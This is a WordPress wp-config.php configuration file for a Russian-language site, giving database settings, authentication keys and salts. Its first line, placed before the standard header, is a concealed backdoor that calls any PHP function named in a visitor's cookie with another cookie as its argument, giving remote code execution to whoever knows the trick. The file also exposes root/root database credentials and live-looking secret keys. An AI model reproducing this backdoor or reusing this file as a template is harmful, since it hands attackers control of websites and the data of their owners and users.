<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);


/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'photobks');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'root');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '39lwbicyo0ydiao3tzwnbtinr4oazi1v3qytsly8drcxl5ddmlntn3smvnvzile2');
define('SECURE_AUTH_KEY',  'h9u7nf3kwfz3c6uap3qpomma8xsvnqww9xufbdgu2sz9vzpvin94rwczbohxritk');
define('LOGGED_IN_KEY',    '4ncwkrbnn3hrwks2ni9im8uforrveicsu6gkwmhcx1cyxubxvluxphllqic07qrj');
define('NONCE_KEY',        'l04iqqfxhvv5wbqiwmshzprd41ynrstnusjeoregyu40mwd0rwmk8viwfpr3jxlt');
define('AUTH_SALT',        'dfglrcijxmwre7jnxcps0eerklor7qfyxrgii2qb6tpitd0vxmelncrjtlcgd3w4');
define('SECURE_AUTH_SALT', 'uuucsqnro6ld3tpxp6hkzgmq6tije8exokm0ezsvm8vh9vw7ennwnsmo1zqydc4r');
define('LOGGED_IN_SALT',   'ao6n2vq6rr9otjlkktkhk5ls895p3iaf6y1oxejig3hhd6zdburpf4u2wawmgivb');
define('NONCE_SALT',       'yqlu0vxr22bovx091wqa8zmya0dmc6uudjvyerzkgbsk7mtrliheag2w7k6eovzv');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', 'ru_RU');

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
